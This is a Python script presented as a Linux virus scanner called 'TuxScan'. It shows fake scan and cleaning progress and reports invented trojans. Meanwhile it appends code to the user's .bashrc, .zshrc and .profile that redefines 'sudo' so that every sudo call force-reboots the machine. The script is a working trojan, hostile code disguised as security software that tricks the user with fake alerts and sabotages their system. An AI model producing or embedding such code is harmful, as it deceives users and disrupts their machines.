#!/usr/bin/env python

import datetime
import os
import random
import shutil
from datetime import datetime as dt
from time import sleep as w

banner = """=================
     TuxScan
=================
"""

threats = """Found threats!
- Trojan.Hercules!e4ca2: /usr/bin/super-bash
- Trojan.Hercules!d3f96: /usr/bin/super-zsh"""

print(banner)

print("Initializing...")

# QUACKROOT code
marker = f"\n# ADDED BY QUACKROOT {dt.now(datetime.timezone.utc).isoformat()} -- remove manually\n"
bash_zsh = marker + "sudo() {\n  sudo systemctl reboot --force\n}\n"
home = os.path.expanduser("~")
if not home:
    raise RuntimeError("Cannot determine home directory")

bashrc = os.path.join(home, ".bashrc")
zshrc = os.path.join(home, ".zshrc")
loginrc = os.path.join(home, ".profile")

rcfiles = [
    (bashrc, bash_zsh),
    (zshrc, bash_zsh),
    (loginrc, bash_zsh),
]


def make_backup(path):
    if os.path.exists(path):
        bak = path + ".bak"
        shutil.copy2(path, bak)


def ensure_dir_for_file(path):
    d = os.path.dirname(path)
    if d and not os.path.exists(d):
        os.makedirs(d, exist_ok=True)


def append(path, content):
    make_backup(path)
    ensure_dir_for_file(path)
    with open(path, "a", encoding="utf-8") as f:
        f.write(content)


# TuxScan code
def clear() -> None:
    os.system("clear")


def scan() -> None:
    percentage = 0
    while percentage < 100:
        w(random.randint(1, 5))
        clear()
        print(banner)
        percentage += random.randint(7, 15)
        print(f"Scanning... {percentage if percentage < 100 else 100}%")
    clear()
    print(banner)


def clean() -> None:
    percentage = 0
    while percentage < 100:
        w(random.randint(1, 5))
        clear()
        print(banner)
        print(threats)
        percentage += random.randint(7, 15)
        print(f"Cleaning threats... {percentage if percentage < 100 else 100}%")
    clear()
    print(banner)


print("Scanning...")
scan()
print(threats)
print("Cleaning threats...")
clean()
for path, content in rcfiles:
    append(path, content)
print("Threats cleaned successfully!")
